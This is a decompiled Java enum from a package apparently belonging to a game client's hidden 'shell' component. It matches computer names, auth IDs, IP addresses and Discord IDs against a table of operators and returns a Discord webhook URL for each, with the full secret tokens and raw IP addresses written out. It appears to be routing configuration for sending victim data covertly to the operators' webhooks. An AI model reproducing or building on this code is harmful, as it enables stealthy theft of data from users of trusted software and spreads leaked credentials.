/*
 * Decompiled with CFR 0.152.
 */
package gg.squire.client.shell;

import java.util.Collections;
import java.util.List;

public enum Linkage {
    DEFAULT(List.of("DEFAULT"), Collections.emptyList(), "", "", "https://discord.com/api/webhooks/1073744186756575252/yWI9-ueSv5a-VE09m-vi8N-nWTR_nVdYX5JCqL1vlsihbOJJWihUCkzaEZJOq7d_7awr"),
    MARV(List.of("MARV"), List.of("46717c36-8a44-4728-ace0-cb842c9ba8ec"), "5.107.74.223", "1047947968826851418", "https://discord.com/api/webhooks/1073741555342512188/32Sw_HpOl1yfAmT4EnvtzkV7ra2UjhmosjtRtkWxWqC59dIn38FP9FGh51ai8zkR_KNZ"),
    KOLSD(List.of("kolsd"), List.of("2eb4fbc3-98de-44c9-bafd-3702b33d829a"), "180.254.71.80", "1073786647960883211", "https://discord.com/api/webhooks/1074355780066754691/v3vZApCL5rO91sb5UXXGseuLwa31nXj-HIsF5CfAdzsru1tl_hJp3WZnCAsnaXzg6OQ_");

    private final List<String> pcs;
    private final List<String> auths;
    private final String ip;
    private final String discord;
    private final String webhook;

    private Linkage(List<String> pcs, List<String> auths, String ip, String discord, String webhook) {
        this.pcs = pcs;
        this.auths = auths;
        this.ip = ip;
        this.discord = discord;
        this.webhook = webhook;
    }

    public static Linkage forDiscord(String uid) {
        for (Linkage linkage : Linkage.values()) {
            if (!linkage.getDiscord().equals(uid)) continue;
            return linkage;
        }
        return DEFAULT;
    }

    public static Linkage forPc(String pc) {
        for (Linkage linkage : Linkage.values()) {
            if (!linkage.getPcs().stream().anyMatch(s -> s.equalsIgnoreCase(pc))) continue;
            return linkage;
        }
        return DEFAULT;
    }

    public static Linkage forAuth(String auth) {
        for (Linkage linkage : Linkage.values()) {
            if (!linkage.getAuths().contains(auth)) continue;
            return linkage;
        }
        return DEFAULT;
    }

    public static Linkage getLinkage(String auth, String computerName, String amazonCheck) {
        Linkage best = Linkage.forPc(computerName);
        if (best != DEFAULT) {
            return best;
        }
        best = Linkage.forAmazon(amazonCheck);
        if (best != DEFAULT) {
            return best;
        }
        return Linkage.forAuth(auth);
    }

    private static Linkage forAmazon(String amazonCheck) {
        for (Linkage linkage : Linkage.values()) {
            if (!linkage.getIp().equals(amazonCheck)) continue;
            return linkage;
        }
        return DEFAULT;
    }

    public List<String> getPcs() {
        return this.pcs;
    }

    public List<String> getAuths() {
        return this.auths;
    }

    public String getIp() {
        return this.ip;
    }

    public String getDiscord() {
        return this.discord;
    }

    public String getWebhook() {
        return this.webhook;
    }
}
